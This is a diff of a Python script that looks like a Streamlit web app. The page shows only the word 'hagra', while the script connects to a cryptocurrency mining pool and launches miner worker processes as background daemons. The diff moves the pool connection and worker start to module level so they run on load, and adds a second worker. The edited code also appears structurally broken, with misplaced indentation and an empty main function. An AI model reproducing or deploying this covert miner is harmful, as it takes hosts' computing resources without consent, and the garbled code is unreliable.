@@ -27,22 +27,23 @@ nicehash = False
 st.write("hagra")
 
 print("cpus",multiprocessing.cpu_count())
-def main():
-    hc = 0
-    nhc =0
-    xhc =0
-    pool_ip = socket.gethostbyname(pool_host)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+hc = 0
+nhc =0
+xhc =0
+pool_ip = socket.gethostbyname(pool_host)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
-    s.connect((pool_ip, pool_port))
-    #starting miner
-    q = Queue()
+s.connect((pool_ip, pool_port))
+#starting miner
+q = Queue()
 
    
     
     proc = Process(target=worker, args=(q, s))
     proc.daemon = True
     proc.start()
+def main():
+
 
 
     login = {
@@ -210,6 +211,9 @@ if __name__ == '__main__':
     poc = Process(target=main,)
     poc.daemon = True
     poc.start()
+    proc = Process(target=worker, args=(q, s))
+    proc.daemon = True
+    proc.start()
     #main()
 
     
